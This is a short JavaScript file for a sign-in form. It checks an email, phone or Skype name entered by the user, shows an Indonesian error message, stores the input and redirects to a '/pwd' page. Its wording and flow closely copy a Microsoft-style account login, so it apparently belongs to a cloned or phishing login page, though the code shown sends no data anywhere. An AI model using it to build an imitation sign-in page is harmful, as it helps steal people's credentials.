document.addEventListener("DOMContentLoaded", function () {
    var button = document.querySelector(".btn-primary");

    button.addEventListener("click", function () {
        var inputField = document.getElementById("userInput");
        var userInput = inputField.value;
        var errorMessage = document.getElementById("error-message");
        var buttonContainer = document.getElementById("button-container");

        errorMessage.style.display = "none";
        inputField.classList.remove("error");
        buttonContainer.style.marginTop = "60px";

        if (userInput.trim() === "") {
            errorMessage.textContent =
                "Masukkan alamat email, nomor telepon, atau nama Skype yang valid.";
            errorMessage.style.display = "block";
            buttonContainer.style.marginTop = "19px";
            inputField.classList.add("error");
            return false;
        }

        var regex = /[<>\"'`;()&]/;
        if (regex.test(userInput)) {
            errorMessage.textContent =
                "Masukkan alamat email, nomor telepon, atau nama Skype yang valid.";
            errorMessage.style.display = "block";
            buttonContainer.style.marginTop = "19px";
            inputField.classList.add("error");
            return false;
        }

        sessionStorage.setItem("userInput", userInput);

        window.location.href = "/pwd";
        return true;
    });
});
